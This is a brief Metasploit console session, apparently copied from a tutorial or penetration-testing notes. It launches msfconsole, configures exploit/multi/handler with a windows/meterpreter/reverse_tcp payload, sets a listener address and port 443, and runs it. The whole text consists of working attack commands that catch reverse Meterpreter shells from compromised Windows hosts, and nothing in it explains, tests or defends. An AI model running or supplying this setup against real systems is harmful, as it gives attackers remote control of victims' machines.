msfconsole;

msf > use exploit/multi/handler msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp msf exploit(handler) > set LHOST 192.168.8.92 LHOST => 192.168.8.92 msf exploit(handler) > set LPORT 443 LPORT => 443 msf exploit(handler) > exploit
